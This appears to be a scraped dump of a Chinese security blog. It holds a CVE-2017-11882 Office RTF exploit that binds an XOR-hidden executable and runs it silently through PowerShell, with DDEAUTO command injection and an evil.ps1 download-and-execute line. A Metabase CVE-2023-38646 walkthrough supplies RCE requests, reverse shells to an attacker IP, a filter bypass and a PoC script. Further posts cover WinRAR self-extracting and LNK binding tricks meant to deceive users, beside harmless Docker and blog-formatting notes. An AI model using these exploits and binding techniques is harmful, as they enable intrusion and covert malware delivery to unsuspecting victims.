~\\x8b\\xcf\\xe8v\\x02\\x00\\x00\\x89D$0\\x85\\xc0u\\x03S\\xff\\xd6\\xba\\x19.\\xb5\\xae\\x8b\\xcf\\xe8_\\x02\\x00\\x00\\x8b\\xd8\\x85\\xdbu\\x03P\\xff\\xd6\\xbaZj\\x0c\\xbb\\x8b\\xcf\\xe8J\\x02\\x00\\x00\\x89D$@\\x85\\xc0u\\x03P\\xff\\xd6\\xba\\x8d\\xbfw\\x82\\x8b\\xcf\\xe83\\x02\\x00\\x00\\x89D$&lt;\\x85\\xc0u\\x03P\\xff\\xd6jDY\\x8dD$X3\\xd2\\x88\\x10@Iu\\xfaj\\x10Y\\x8dD$H\\x88\\x10@Iu\\xfa3\\xc0\\xc7D$XD\\x00\\x00\\x00f\\x89\\x84$\\x88\\x00\\x00\\x00\\x8dD$HP\\x8dD$\\\\\\xc7\\x84$\\x88\\x00\\x00\\x00\\x01\\x00\\x00\\x00PRRj\\x02RRR\\x8dD$0\\xc7D$0EQNEPR\\xc7D$&lt;DT32\\xc7D$@.EXE\\x88T$D\\xff\\xd3\\x85\\xc0u\\x04j\\xff\\xff\\xd6j`Y\\x8d\\x84$\\xa0\\x00\\x00\\x00\\xc6\\x00\\x00@Iu\\xf9\\x83\\xbc$\\xa0\\x00\\x00\\x00\\x03tA\\x8b|$4\\x8b\\\\$$h\\x88\\x13\\x00\\x00\\x8d\\x84$\\xa4\\x00\\x00\\x00P\\xff\\xd7\\x85\\xc0u\\x03P\\xff\\xd6\\x83\\xbc$\\xa0\\x00\\x00\\x00\\x03t\\x19h\\x02\\x00\\x01\\x00\\xfft$X\\xfft$X\\xff\\xd3\\x83\\xbc$\\xa0\\x00\\x00\\x00\\x03u\\xc7\\x8b\\x9c$\\xb0\\x00\\x00\\x00\\x8d\\x84$\\x00\\x01\\x00\\x00\\x8b\\xbc$\\xb4\\x00\\x00\\x00\\xb9\\xcc\\x02\\x00\\x00\\xc6\\x00\\x00@Iu\\xf9\\x8d\\x84$\\x00\\x01\\x00\\x00\\xc7\\x84$\\x00\\x01\\x00\\x00\\x01\\x00\\x01\\x00PW\\xffT$L\\x85\\xc0u\\x03P\\xff\\xd6\\x8dD$,Pj@h\\x00P\\x00\\x00h\\x00\\x10@\\x00S\\xffT$4\\x85\\xc0u\\x03P\\xff\\xd6\\x83d$,\\x00\\xe8k\\x01\\x00\\x00\\x83d$(\\x00\\x8dH\\x01\\x89L$ \\x8bD$ \\x8b\\x00\\x89D$(\\x8dD$,\\x83\\xc1\\x04P\\xfft$,Qh\\x00\\x10@\\x00S\\xffT$L3\\xdb\\x85\\xc0u\\x03S\\xff\\xd6\\x8d\\x84$\\x00\\x01\\x00\\x00\\xc7\\x84$\\xb8\\x01\\x00\\x00\\x00\\x10@\\x00PW\\xffT$8\\x85\\xc0u\\x03S\\xff\\xd6S\\xffT$D\\x85\\xc0u\\x03S\\xff\\xd6h\\x02\\x00\\x01\\x00\\xfft$X\\xfft$X\\xffT$0\\x85\\xc0u\\x03S\\xff\\xd6\\xfft$P\\xffT$@\\x85\\xc0u\\x03S\\xff\\xd6S\\xff\\xd6_^[\\x8b\\xe5]\\xc3U\\x8b\\xecQSVW\\x8b\\xd9d\\xa10\\x00\\x00\\x00\\x8b@\\x0c\\x8bp\\x0c\\x8bV0\\x8b\\xc2\\x89E\\xfc\\x85\\xd2t%\\x0f\\xb7\\x02\\xb9\\x05\\x15\\x00\\x003\\xff\\xeb\\rk\\xc9!\\x0f\\xb7\\xc0\\x03\\xc8G\\x0f\\xb7\\x04zf\\x85\\xc0u\\xee;\\xcbt\\x15\\x8bE\\xfc\\x8b6\\x8bV0;\\xd0u\\xce3\\xc0_^[\\x8b\\xe5]\\xc3\\x8bF\\x18\\xeb\\xf4U\\x8b\\xec\\x83\\xec\\x10\\x8bA&lt;\\x89U\\xfc\\x8bD\\x08x\\x85\\xc0tV\\x8bT\\x08\\x1cS\\x8b\\\\\\x08$\\x03\\xd1V\\x8bt\\x08 \\x03\\xd9\\x8bD\\x08\\x18\\x03\\xf1\\x89U\\xf03\\xd2\\x89u\\xf4\\x89E\\xf8W\\x85\\xc0t)\\x8b4\\x96\\xbf\\x05\\x15\\x00\\x00\\x03\\xf1\\xeb\\tk\\xff!\\x0f\\xbe\\xc0\\x03\\xf8F\\x8a\\x06\\x84\\xc0u\\xf1;&#125;\\xfct\\x12\\x8bu\\xf4B;U\\xf8r\\xd73\\xc0_^[\\x8b\\xe5]\\xc3\\x0f\\xb7\\x04S\\x8bU\\xf0\\x8b\\x04\\x82\\x03\\xc1\\xeb\\xeb\\xeb\\x04\\x8b\\x04$\\xc3\\xe8\\xf7\\xff\\xff\\xff\\xc3&#x27;def genrtf605(type, cmd): print &quot;use genrtf605&quot; payload = &#x27;\\x1c\\x00\\x00\\x00\\x02\\x00\\xa8\\xc3\\x99\\x02\\x00\\x00\\x00\\x00\\x00\\x00H\\x90]\\x00l\\x9c[\\x00\\x00\\x00\\x00\\x00\\x03\\x01\\x01\\x03\\n\\n\\x01\\x08ZZ&#x27; if type: payload += stagecmd else: payload += stagesc payload += pack(&#x27;&lt;I&#x27;, 0x00402114) # ret payload += &#x27;\\x00&#x27; * 2 left = 0x100 - len(payload) # 自定义cmd命令 cmd = &quot;&quot;&quot;cmd /k &quot;cd c:\\\\users\\\\a\\desktop &amp; echo 111 &gt; 1.txt&quot; &quot;&quot;&quot; payload += cmd[:left] payload = payload.ljust(0x100, &#x27;\\x00&#x27;) return head605 + payload.encode(&#x27;hex&#x27;) + stuff605 + cmd[left:].ljust(437, &#x27;\\x00&#x27;).encode(&#x27;hex&#x27;) + tail605def genrtf17k(type, cmd): print &quot;use genrtf17k&quot; payload = &#x27;\\x1c\\x00\\x00\\x00\\x02\\x00\\xa8\\xc3kF\\x00\\x00\\x00\\x00\\x00\\x00\\xa0_s\\x00d\\x0cq\\x00\\x00\\x00\\x00\\x00\\x03\\x01\\x01\\x03\\n\\n\\x01\\x08ZZ&#x27; if type: payload += stagecmd else: payload += stagesc payload += pack(&#x27;&lt;I&#x27;, 0x00402114) # ret payload += &#x27;\\x00&#x27; * 2 # cmd = &quot;&quot;&quot;cmd /c powershell -WindowStyle hidden -Command &quot;$rtfpath = Get-ChildItem *.doc | where-object &#123;$_.length -eq 0x00037831&#125; | Select-Object -ExpandProperty Name; $file = gc $rtfpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;; $path = &#x27;%temp%\\\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;;sc $path ([byte[]]($file | select -Skip 008241)) -Encoding Byte; &amp;$path;&quot; &quot;&quot;&quot; payload += cmd payload = payload.ljust(18055, &#x27;\\x00&#x27;) return head17k.lower() + payload.encode(&#x27;hex&#x27;) + tail17k.lower()def genrtf(type, cmd): if len(cmd) &gt; 17967: if type: raise ValueError(&#x27;Command must be shorter than 17967 bytes!&#x27;) else: raise ValueError(&#x27;Code must be shorter than 17967 bytes!&#x27;) if len(cmd) &gt; 605: return genrtf17k(type, cmd) else: return genrtf605(type, cmd)if __name__ == &#x27;__main__&#x27;: parser = argparse.ArgumentParser(prog=&#x27;CVE-2017-11882.py&#x27;, description=&quot;Exploit for CVE-2017-11882 @unamer(https://github.com/unamer/CVE-2017-11882)&quot;) parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, help=&quot;Command or shellcode file to run in target system\\n(Must be shorter than 17967 bytes!!)&quot;, required=True) parser.add_argument(&quot;-t&quot;, &quot;--type&quot;, help=&quot;Type (0:shellcode 1:command, default=1)&quot;, default=1, type=int, choices=[0, 1], required=False) parser.add_argument(&quot;-i&quot;, &quot;--inject&quot;, help=&quot;Inject shellcode to new process&quot;, default=None, required=False) parser.add_argument(&#x27;-o&#x27;, &quot;--output&quot;, help=&quot;Output exploit rtf&quot;, required=True) args = parser.parse_args() data = &#x27;&#x27; if args.type: data = args.cmd else: try: f = open(args.cmd, &#x27;rb&#x27;) data = f.read() f.close() if args.inject is not None: data = stageinject + pack(&#x27;&lt;I&#x27;, len(data)) + data except: raise ValueError(&#x27;Error in reading shellcode file!&#x27;) # 设置异或值 bXorEncryptValue = 0x77 # 打开需要捆绑的文件，需要进行修改 with open(&#x27;./PEiD.exe&#x27;, &#x27;rb&#x27;) as bind: dat = bind.read() bind.close() dat = bytearray(dat) for i in range(len(dat)): dat[i] = dat[i] ^ bXorEncryptValue dat = bytes(dat) with open(args.output, &#x27;wb&#x27;) as f: f.write(genrtf(args.type, data)) f.write(dat) f.close() print &#x27;Done.&#x27; 这里是直接硬编码文件名，可以执行但是我期望实现的是在不知道文件所在路径和文件名的情况下查找到文件 对应修改Poc代码107行(605字节版本)或者127行(17k版本) 1cmd = &quot;&quot;&quot;cmd /c powershell -WindowStyle hidden -Command &quot;$rtfpath=&#x27;c:\\users\\dell\\desktop\\11882.doc&#x27;; $file = gc $rtfpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;; $path = &#x27;%temp%\\\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;;sc $path ([byte[]]($file | select -Skip 008241)) -Encoding Byte; &amp;$path;&quot; &quot;&quot;&quot; 借鉴lnk捆绑exe中通过文件大小查找文件的方式，失败 1cmd = &quot;&quot;&quot;cmd /c powershell -WindowStyle hidden -Command &quot;$rtfpath = Get-ChildItem *.doc | where-object &#123;$_.length -eq 0x00037831&#125; | Select-Object -ExpandProperty Name; $file = gc $rtfpath -Encoding Byte; for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;; $path = &#x27;%temp%\\\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;;sc $path ([byte[]]($file | select -Skip 008241)) -Encoding Byte; &amp;$path;&quot; &quot;&quot;&quot; 通过查看当前目录发现问题：执行路径不是自己期望的文件所在路径，而是默认路径C:\\Windows\\System32 1python2 CVE-2017-11882.py -c &#x27;cmd /c &quot;cd &gt; C:\\\\Users\\DELL\\Desktop\\1.txt&quot;&#x27; -o demo.doc 遍历文件夹 powershell获取文件完整路径 1cmd /c &quot;cd .. &amp; cd .. &amp; powershell -WindowStyle hidden -Command &quot;$rtfpath = Get-ChildItem -filter *.doc -recurse | where-object &#123;$_.length -eq 0x00037831&#125; | %&#123;$_.FullName&#125;;$file = gc $rtfpath -Encoding Byte;for($i=0; $i -lt $file.count; $i++) &#123; $file[$i] = $file[$i] -bxor 0x77 &#125;;$path = &#x27;%temp%\\\\tmp&#x27; + (Get-Random) + &#x27;.exe&#x27;;sc $path ([byte[]]($file | select -Skip 008241)) -Encoding Byte; &amp;$path;&quot;&quot; 存在问题：遍历时间很长而且遍历到很多受保护的文件夹的时候会导致程序终止，稳定性很差 office DDE参考： Office DDE多种利用方式 Office DDE漏洞学习笔记 本来考虑使用宏病毒将doc文档释放到指定目录并隐藏，就可以通过硬编码文件路径的方式在任意位置释放并执行捆绑文件，但是发现rtf格式禁止使用宏。所以决定使用DDE注入命令(通过这种方式打开的cmd会默认在文档文件所在的目录)实现复制捆绑文件到指定目录并植入poc代码中的rtf部分 基础使用12# 进入文档文件: ctrl + F9，在显示的大括号中输入以下内容DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k copy 11882.doc C:\\\\Users\\\\DELL\\\\AppData\\\\Local\\\\Temp&quot; 修改弹窗参考的命令是这样的 1DDEAUTO &quot;C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden IEX (New-Object System.Net.WebClient).DownloadString(&#x27;http://willgenovese.com/hax/evil.ps1&#x27;); # &quot; &quot;Microsoft Document Security Add-On&quot; 但是用起来很多问题，所以自己研究了一下匹配规则重新写了一个： 将构造好的cd命令放最前面，cd命令可自行更改，需要保证字符个数不变 例如下面的示例：#和Office总字符个数是28，如果你想把Office改成其他的显示，比Office长的就需要减少#，短的就增加# 没太说明白，多尝试几次就明白我的意思了，后续命令用&amp;连接即可 1DDEAUTO C:\\\\Program_Files(x86)\\\\Microsoft_Office\\\\Office12\\\\Library\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe &quot;/c cd C:\\\\######################\\\\Office &amp; copy 11882.doc C:\\\\Users\\\\Dell&quot; &quot;Microsoft Document Security Add On&quot; 关于直接将DDE植入到rtf的二进制格式还没有实现 隐藏文件将捆绑文件释放到指定目录并隐藏，即使设置了显示隐藏文件也无法看到通过这种方式隐藏的文件，除非设置显示受保护的系统隐藏文件 (文件夹-&gt;...-&gt;选项-&gt;查看-&gt;隐藏受保护的操作系统文件)，但是会弹窗警告，说的还挺严重的，可以唬唬普通用户 123456789# 隐藏attrib 文件名(引号可省) +s +h# 恢复attrib 文件名(引号可省) -s -h# 参数解释：# attrib: 修改文件属性# +s: 将文件设置为系统文件# +h: 将文件设置为隐藏文件","tags":"cve 捆绑"},{"title":"CVE-2023-38646——Metabase远程代码执行","url":"/post/9c009a02.html","text":"影响版本 Metabase open source 0.46 &lt; 0.46.6.1 Metabase Enterprise 1.46 &lt; 1.46.6.1 Metabase open source 0.45 &lt; v0.45.4.1 Metabase Enterprise 1.45 &lt; 1.45.4.1 Metabase open source 0.44 &lt; 0.44.7.1 Metabase Enterprise 1.44 &lt; 1.44.7.1 Metabase open source 0.43 &lt; 0.43.7.2 Metabase Enterprise 1.43 &lt; 1.43.7.2 漏洞复现参考链接： Metabase RCE漏洞复现 Pre-Auth RCE in Metabase(CVE-2023-38646) 12# 启用靶机docker环境docker run -d -p 3000:3000 --name metabase metabase/metabase:v0.46.6 12# 命令行窗口进入容器后台docker exec -it CONTAINER_ID bash 浏览器访问http://localhost:3000或http://127.0.0.1:3000可以打开靶机界面。本实验不需要对靶机进行任何特殊处理，不过也可以自己创建一个账户看看 获取setup-token12345678GET /api/session/properties HTTP/1.1Host: 127.0.0.1:3000Accept: application/jsonAccept-Language: en-US, en; q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonConnection: closeReferer: http://127.0.0.1:3000 将上述Get请求发送给目标url 响应数据 Post请求触发RCE1234567891011121314151617181920212223242526POST /api/setup/validate HTTP/1.1Host: 127.0.0.1:3000Content-Type: application/json&#123; &quot;token&quot;: &quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;, &quot;details&quot;: &#123; &quot;is_on_demand&quot;: false, &quot;is_full_sync&quot;: false, &quot;is_sample&quot;: false, &quot;cache_ttl&quot;: null, &quot;refingerprint&quot;: false, &quot;auto_run_queries&quot;: true, &quot;schedules&quot;: &#123;&#125;, &quot;details&quot;: &#123; &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;touch /tmp/999&#x27;)\\n$$--=x&quot;, &quot;advanced-options&quot;: false, &quot;ssl&quot;: true &#125;, &quot;name&quot;: &quot;1&quot;, &quot;engine&quot;: &quot;h2&quot; &#125;&#125; 响应截图 命令执行成功 反弹shell注：192.168.21.128是我的kali也就是攻击机ip shell脚本 12!/bin/shbash -c &#x27;exec bash -i &gt;&amp; /dev/tcp/192.168.21.128/6666 0&gt;&amp;1&#x27; 启用http服务用于靶机下载shell脚本，注意0.0.0.0在真正使用的时候应该替换为kali即攻击机ip 1python3 -m http.server 80 靶机下载shell脚本 1234567891011121314151617181920212223242526POST /api/setup/validate HTTP/1.1Host: 127.0.0.1:3000Content-Type: application/json&#123; &quot;token&quot;: &quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;, &quot;details&quot;: &#123; &quot;is_on_demand&quot;: false, &quot;is_full_sync&quot;: false, &quot;is_sample&quot;: false, &quot;cache_ttl&quot;: null, &quot;refingerprint&quot;: false, &quot;auto_run_queries&quot;: true, &quot;schedules&quot;: &#123;&#125;, &quot;details&quot;: &#123; &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;wget http://192.168.21.128:80/1.sh -O /tmp/shell.sh&#x27;)\\n$$--=x&quot;, &quot;advanced-options&quot;: false, &quot;ssl&quot;: true &#125;, &quot;name&quot;: &quot;1&quot;, &quot;engine&quot;: &quot;h2&quot; &#125;&#125; 这里只用下载一次就够了，我在本机上试了几次所以有多条下载记录。metabase是搭在本地的，所以下载使用的ip和本机是同样的 下载成功 执行shell脚本 1234567891011121314151617181920212223242526POST /api/setup/validate HTTP/1.1Host: 127.0.0.1:3000Content-Type: application/json&#123; &quot;token&quot;: &quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;, &quot;details&quot;: &#123; &quot;is_on_demand&quot;: false, &quot;is_full_sync&quot;: false, &quot;is_sample&quot;: false, &quot;cache_ttl&quot;: null, &quot;refingerprint&quot;: false, &quot;auto_run_queries&quot;: true, &quot;schedules&quot;: &#123;&#125;, &quot;details&quot;: &#123; &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;/bin/bash /tmp/shell.sh&#x27;)\\n$$--=x&quot;, &quot;advanced-options&quot;: false, &quot;ssl&quot;: true &#125;, &quot;name&quot;: &quot;1&quot;, &quot;engine&quot;: &quot;h2&quot; &#125;&#125; 监听6666端口，获取靶机反弹shell 1nc -lvvp 6666 源码分析setup-token获取参考： Metabase 远程代码执行漏洞分析 H2 JDBC 深入利用 调用/api/setup/validate通过api.database/test-database-connection来处理输入的参数完成对数据库的校验。 /api/setup/validate setup在安装时会校验setup-token参数是否正确，来判断是否要进行下步的数据库连接 校验 setup-token在进行生成的时候被默认设置为了public权限，所以可以通过/api/session/properties来读取 获取setup-token setup-token利用zip URI方法H2在解析 init参数时对CREATE TRIGGER会由loadFromSource做特殊处理，根据执行内容的开头来判断是否为需要通过javascript引擎执行。如果以javascript开头就会通过javascript引擎进行编译然后进行执行。 我们就可以通过javascript引擎来实现代码执行，不过该方式在JDK 15之后移除了默认的解析，但是metabase在项目中使用到了js引擎技术。 YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx需要使用自己的IP和Port重新编码 123456789101112131415161718192021222324252627POST /api/setup/validate HTTP/1.1Host: localhostContent-Type: application/jsonContent-Length: 812&#123; &quot;token&quot;: &quot;5491c003-41c2-482d-bab4-6e174aa1738c&quot;, &quot;details&quot;: &#123; &quot;is_on_demand&quot;: false, &quot;is_full_sync&quot;: false, &quot;is_sample&quot;: false, &quot;cache_ttl&quot;: null, &quot;refingerprint&quot;: false, &quot;auto_run_queries&quot;: true, &quot;schedules&quot;: &#123;&#125;, &quot;details&quot;: &#123; &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)\\n$$--=x&quot;, &quot;advanced-options&quot;: false, &quot;ssl&quot;: true &#125;, &quot;name&quot;: &quot;an-sec-research-team&quot;, &quot;engine&quot;: &quot;h2&quot; &#125;&#125; H2限制绕过转载：Metabase 远程代码执行漏洞分析 分析源码发现H2连接时会将INIT参数移除 123456789101112(defn- connection-string-set-safe-options &quot;Add Metabase Security Settings™ to this `connection-string` (i.e. try to keep shady users from writing nasty SQL).&quot; [connection-string] &#123;:pre [(string? connection-string)]&#125; (let [[file options] (connection-string-&gt;file+options connection-string)] (file+options-&gt;connection-string file (merge (-&gt;&gt; options;; Remove INIT=... from options for security reasons (Metaboat #165);; http://h2database.com/html/features.html#execute_sql_on_connection (remove (fn [[k _]] (= (u/lower-case-en k) &quot;init&quot;))) (into &#123;&#125;)) &#123;&quot;IFEXISTS&quot; &quot;TRUE&quot;&#125;)))) connection-string-set-safe-options使用了lower-case-en将参数名转换为小写字母之后与init匹配进行校验.H2则是将参数名转换为大写 这里刚好可以使用 拉丁字母ı替换INIT中的I，ıNIT在转成大写时为INIT但是ıNIT转成小写后为ınit中的ı没有被转换，绕过限制 构造post请求 123456789101112131415161718192021222324252627POST /api/setup/validate HTTP/1.1Host: 127.0.0.1:3000Content-Type: application/json&#123; &quot;token&quot;: &quot;141c5a35-3b1d-4c1b-8eca-0591111fa08c&quot;, &quot;details&quot;: &#123; &quot;is_on_demand&quot;: false, &quot;is_full_sync&quot;: false, &quot;is_sample&quot;: false, &quot;cache_ttl&quot;: null, &quot;refingerprint&quot;: false, &quot;auto_run_queries&quot;: true, &quot;schedules&quot;: &#123;&#125;, &quot;details&quot;: &#123; &quot;db&quot;: &quot;file:/metabase.db/metabase.db;ınit=CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;touch /tmp/abc&#x27;)\\n$$&quot;, &quot;advanced-options&quot;: true&#125;, &quot;name&quot;: &quot;1&quot;, &quot;engine&quot;: &quot;h2&quot;, &quot;database&quot;: &#123;&quot;db&quot;: &quot;file:/metabase.db/metabase.db;ınit=CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c touch /tmp/abc&#x27;) $$&quot;, &quot;advanced-options&quot;: true, &quot;ssl&quot;: false&#125; &#125;&#125; RCE成功 mem方法参考：0xrobiul / CVE-2023-38646 这个我没有做过，感兴趣可以自行尝试，这个方法需要使用Burpsuite的collaborator，专业版Burpsuite自带这个功能，下载地址：Burpsuite_Pro poc代码 1234567891011121314151617181920212223242526272829import requestsimport argparsefrom colorama import Fore, StyleGcyan = Fore.YELLOW + Style.BRIGHTCyan = Fore.CYAN + Style.BRIGHTSTOP = Style.RESET_ALLlogo = &#x27;&#x27;&#x27; _____ _____ ___ __ ___ ____ ____ ___ __ _ _ __ / __\\ \\ / / __|_|_ ) \\_ )__ /__|__ /( _ ) / /| | | / / | (__ \\ V /| _|___/ / () / / |_ \\___|_ \\/ _ \\/ _ \\_ _/ _ \\\\ \\___| \\_/ |___| /___\\__/___|___/ |___/\\___/\\___/ |_|\\___/ &#x27;&#x27;&#x27;print(Gcyan + logo + STOP)print(Cyan + &quot;The PoC Finder!!&quot; + STOP + Gcyan + &quot; By: 0xRobiul\\n&quot; + STOP)parser = argparse.ArgumentParser()parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, type=str, required=True, help=&quot;Target URL.&quot;)parser.add_argument(&quot;-t&quot;, &quot;--token&quot;, type=str, required=True, help=&quot;Setup-Token From /api/session/properties .&quot;)parser.add_argument(&quot;-c&quot;, &quot;--collabrator&quot;, type=str, required=True, help=&quot;Burp Collabrator Client.&quot;)args = parser.parse_args()url = args.url + &quot;/api/setup/validate&quot;headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&quot;, &quot;Accept&quot;: &quot;application/json&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;payload=&#123;&quot;details&quot;: &#123;&quot;details&quot;: &#123;&quot;advanced-options&quot;: True, &quot;classname&quot;: &quot;org.h2.Driver&quot;, &quot;subname&quot;: &quot;mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(new String[]&#123;\\&quot;sh\\&quot;, \\&quot;-c\\&quot;, cmd&#125;)\\\\;&#125;$$\\\\;CALL SHELLEXEC(&#x27;curl -d key=0xRobiul &quot; + args.collabrator +&quot;&#x27;);&quot;, &quot;subprotocol&quot;: &quot;h2&quot;&#125;, &quot;engine&quot;: &quot;postgres&quot;, &quot;name&quot;: &quot;x&quot;&#125;, &quot;token&quot;: args.token&#125;attk = requests.post(url, headers=headers, json=payload)print(Cyan + &quot;Done!! Check Burp Colabrator!!&quot; + STOP) 使用方法 12python3 CVE-2023-38646.py -u 目标url:port -t token -c Burp_Collabrator_Client# 例如：python3 CVE-2023-38646.py -u 127.0.0.1:3000 -t 141c5a35-3b1d-4c1b-8eca-0591111fa08c -c wwwkzg5j2qxyxqm836v2fxj34ualybm0.oastify.com 修复","tags":"cve"},{"title":"docker环境搭建","url":"/post/2dc21646.html","text":"Windows搭建docker 下载Docker Desktop for Windows：Install Docker Desktop on Windows 双击 Docker Desktop Installer.exe 安装 直接打开docker面板或者命令行窗口使用docker命令运行 kali搭建docker基础命令拉取镜像1docker pull git.mamahaha.work/sangge/yacl:latest 查看所有容器1docker ps -a 创建容器1docker run -d -it 镜像ID 运行容器1docker exec -it 容器ID bash 查看正在运行的容器1docker ps 退出容器1exit docker面板截图 docker常用命令 docker常见命令 注意删除容器会直接清除容器数据，保存容器数据可以使用Volumes","tags":"docker"},{"title":"设置同级分类与父子分类","url":"/post/34d98901.html","text":"前言转载自：Hexo 一篇文章多个 categories 父子分类123categories:- 博客- 搭建 同级分类123categories:- [CVE]- [捆绑] 同级分类复合父子分类123categories:- [CVE, poc分析]- [捆绑, 源码]","tags":"博客搭建"},{"title":"折叠框与tab分栏","url":"/post/b78500b8.html","text":"折叠框效果 折叠框 源码123&#123;% folding 折叠框 %&#125;![img](图片url)&#123;% endfolding %&#125; tab分栏效果1号分栏2号分栏3号分栏This is Tab 1.This is Tab 2.This is Tab 3. 源码123注：1. &#123;% tabs %&#125;如果不命名会有警告，但是没有什么影响我就没有管2. 如果只是想引用&#123;% tabs %&#125;的话，不可以写在外面，否则会被当作分栏标志触发报错！ 123456789101112131415161718192021&#123;% tabs 分栏 %&#125;&lt;!-- tab 1号分栏 --&gt;This is Tab 1.&lt;!-- endtab --&gt;&lt;!-- tab 2号分栏 --&gt;This is Tab 2.&lt;!-- endtab --&gt;&lt;!-- tab 3号分栏 --&gt;This is Tab 3.&lt;!-- endtab --&gt;&#123;% endtabs %&#125; 折叠框叠加tab分栏效果 折叠框 1号分栏2号分栏3号分栏This is Tab 1.This is Tab 2.This is Tab 3. 源码12345678910111213141516171819202122232425&#123;% folding 折叠框 %&#125;&#123;% tabs %&#125;&lt;!-- tab 1号分栏 --&gt;This is Tab 1.&lt;!-- endtab --&gt;&lt;!-- tab 2号分栏 --&gt;This is Tab 2.&lt;!-- endtab --&gt;&lt;!-- tab 3号分栏 --&gt;This is Tab 3.&lt;!-- endtab --&gt;&#123;% endtabs %&#125;&#123;% endfolding %&#125;","tags":"博客美化"},{"title":"WinRar自解压","url":"/post/8b352432.html","text":"使用方法 选中源文件和需要捆绑的文件，右键添加到压缩文件 自解压格式->高级自解压选项 设置解压缩路径，%temp%是临时文件的存储路径 源文件是一定要执行的，捆绑的文件是否执行看自己需求，执行的话是显式的，除非你的程序没有界面什么的 设置解压后执行的程序 模式一定要选择隐藏全部，否则会出现自解压界面 解压模式 解压并替换文件；覆盖全部文件 双击生成的自解压文件，两个文件均被执行 文件解压到了%temp%路径 自解压文件可以改改名字：这里使用`Unicode控制字符`实现文件名反转 效果 另外可以用resource hacker改改图标资源什么的","tags":"捆绑"},{"title":"lnk捆绑执行exe","url":"/post/ba5041c3.html","text":"前言转载自：EmbedExeLnk 使用方法编译源码注：报错的解决在下面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#define INVALID_SET_FILE_POINTER 0xFFFFFFFF#define HasName 0x00000004#define HasArguments 0x00000020#define HasIconLocation 0x00000040#define IsUnicode 0x00000080#define HasExpString 0x00000200#define PreferEnvironmentPath 0x02000000struct ShellLinkHeaderStruct&#123; DWORD dwHeaderSize; CLSID LinkCLSID; DWORD dwLinkFlags; DWORD dwFileAttributes; FILETIME CreationTime; FILETIME AccessTime; FILETIME WriteTime; DWORD dwFileSize; DWORD dwIconIndex; DWORD dwShowCommand; WORD wHotKey; WORD wReserved1; DWORD dwReserved2; DWORD dwReserved3;&#125;;struct EnvironmentVariableDataBlockStruct&#123; DWORD dwBlockSize; DWORD dwBlockSignature; char szTargetAnsi[MAX_PATH]; wchar_t wszTargetUnicode[MAX_PATH];&#125;;DWORD CreateLinkFile(char *pExePath, char *pOutputLinkPath, char *pLinkIconPath, char *pLinkDescription)&#123; HANDLE hLinkFile = NULL; HANDLE hExeFile = NULL; ShellLinkHeaderStruct 